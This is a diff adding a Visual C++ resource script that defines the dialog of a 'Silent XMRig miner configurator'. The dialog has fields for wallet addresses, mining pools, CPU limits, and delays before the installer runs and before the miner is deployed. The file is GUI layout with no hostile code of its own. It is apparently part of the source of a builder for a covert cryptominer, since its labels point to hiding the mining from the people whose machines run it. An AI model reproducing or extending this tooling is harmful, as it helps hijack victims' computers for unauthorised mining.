@@ -1,0 +1,158 @@
+// Microsoft Visual C++ generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "winres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// English (United States) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
+#pragma code_page(1252)
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE 
+BEGIN
+    "#include ""winres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE 
+BEGIN
+    "\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_DIALOG1 DIALOGEX 0, 0, 415, 391
+STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "Silent XMRig miner configurator"
+FONT 8, "MS Shell Dlg", 400, 0, 0x1
+BEGIN
+    DEFPUSHBUTTON   "Generate",IDOK,293,370,50,14
+    PUSHBUTTON      "Cancel",IDCANCEL,358,370,50,14
+    EDITTEXT        IDC_EDIT1,8,17,400,15,ES_AUTOHSCROLL
+    GROUPBOX        "Wallets addresses",IDC_STATIC,7,7,401,255
+    EDITTEXT        IDC_EDIT2,8,35,400,15,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT3,8,53,400,15,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT4,8,71,400,15,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT5,8,89,400,15,ES_AUTOHSCROLL
+    LTEXT           "Time Zone 1 pools",IDC_STATIC,17,109,58,8
+    LTEXT           "Time Zone 2 pools",IDC_STATIC,122,110,58,8
+    LTEXT           "Time Zone 3 pools",IDC_STATIC,221,110,58,8
+    LTEXT           "Time Zone 4 pools",IDC_STATIC,320,110,58,8
+    EDITTEXT        IDC_EDIT6,7,119,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT7,7,134,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT8,7,149,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT9,7,164,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT10,108,119,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT11,108,134,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT12,108,149,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT13,108,164,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT14,210,119,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT15,210,134,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT16,210,149,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT17,210,164,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT18,321,119,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT19,321,134,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT20,321,149,87,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT21,321,164,87,14,ES_AUTOHSCROLL
+    LTEXT           "Min.",IDC_STATIC,9,193,14,8
+    LTEXT           "Max.",IDC_STATIC,9,207,17,8
+    EDITTEXT        IDC_EDIT22,26,190,40,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT23,26,205,40,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT24,117,190,40,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT25,117,205,40,14,ES_AUTOHSCROLL
+    LTEXT           "Min.",IDC_STATIC,98,194,14,8
+    LTEXT           "Max.",IDC_STATIC,98,207,17,8
+    GROUPBOX        "Delay before deploy miner (days)",IDC_STATIC,96,181,134,40
+    GROUPBOX        "Installer delay (seconds)",IDC_STATIC,8,181,88,40
+    GROUPBOX        "Minimum RAM for light mode(Mb)",IDC_STATIC,7,220,111,29
+    EDITTEXT        IDC_EDIT27,123,230,27,14,ES_AUTOHSCROLL | ES_NUMBER
+    GROUPBOX        "CPU(%)",IDC_STATIC,118,219,36,30
+    EDITTEXT        IDC_EDIT28,159,230,64,14,ES_AUTOHSCROLL | ES_NUMBER
+    GROUPBOX        "Additional XMRig arguments",IDC_STATIC,237,181,171,68
+    EDITTEXT        IDC_EDIT29,240,230,168,14,ES_AUTOHSCROLL
+    GROUPBOX        "Custom arguments config (Everything above will be ignored) one of 3 arguments will be selected randomly at XMRig start",IDC_STATIC,7,250,401,65
+    EDITTEXT        IDC_EDIT30,7,262,401,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT31,7,279,401,14,ES_AUTOHSCROLL
+    GROUPBOX        "Arguments test",IDC_STATIC,7,315,401,25
+    EDITTEXT        IDC_EDIT32,7,296,401,14,ES_AUTOHSCROLL
+    PUSHBUTTON      "Test",IDC_BUTTON1,7,370,61,14
+    EDITTEXT        IDC_EDIT33,7,324,401,45,ES_MULTILINE | WS_VSCROLL
+    LTEXT           "Here you configure the coin to mine, use tls or other things that will be added to XMRig arguments.\nAs example it is configured to mine Monero with tls, keepalive, worker name and low CPU priority",IDC_STATIC,240,191,166,33
+    GROUPBOX        "L3 cache/thread(KB)",IDC_STATIC,153,219,77,30
+    EDITTEXT        IDC_EDIT26,10,230,100,14,ES_AUTOHSCROLL | ES_NUMBER
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO
+BEGIN
+    IDD_DIALOG1, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 408
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 384
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// AFX_DIALOG_LAYOUT
+//
+
+IDD_DIALOG1 AFX_DIALOG_LAYOUT
+BEGIN
+    0
+END
+
+#endif    // English (United States) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
